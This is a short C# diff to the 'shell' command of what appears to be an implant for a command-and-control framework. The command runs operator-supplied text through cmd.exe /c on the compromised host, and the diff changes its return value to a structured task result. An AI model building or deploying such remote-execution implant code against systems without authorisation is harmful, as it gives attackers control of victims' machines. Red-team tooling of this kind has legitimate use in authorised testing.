@@ -10,15 +10,36 @@ namespace Tasks.Commands
     {
         public override string Name => "shell";
 
-        public override string Execute(MythicTask task)
+        public override MythicTaskResult Execute(MythicTask task)
         {
+            MythicTaskResult result;
+
             var Arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<ShellParam>();
 
             if (Arguments is null || Arguments.arguments is null)
-                return "No arguments supplied. Please supply a command to run";
+            {
+                result = new MythicTaskResult
+                {
+                    task_id = task.id,
+                    user_output = "No arguments supplied. Please supply a command to run",
+                    completed = true,
+                    status = "Error",
+                    error = "No arguments supplied. Please supply a command to run"
+                };
+
+                return result;
+            }
 
             Arguments.arguments = string.Join(" ", Arguments.arguments);
-            return Internal.Execute.ExecuteCommand(@"C:\Windows\System32\cmd.exe", $"/c {Arguments.arguments}");
+            result = new MythicTaskResult
+            {
+                task_id = task.id,
+                user_output = Internal.Execute.ExecuteCommand(@"C:\Windows\System32\cmd.exe", $"/c {Arguments.arguments}"),
+                completed = true,
+                status = "success"
+            };
+
+            return result;
         }
     }
 
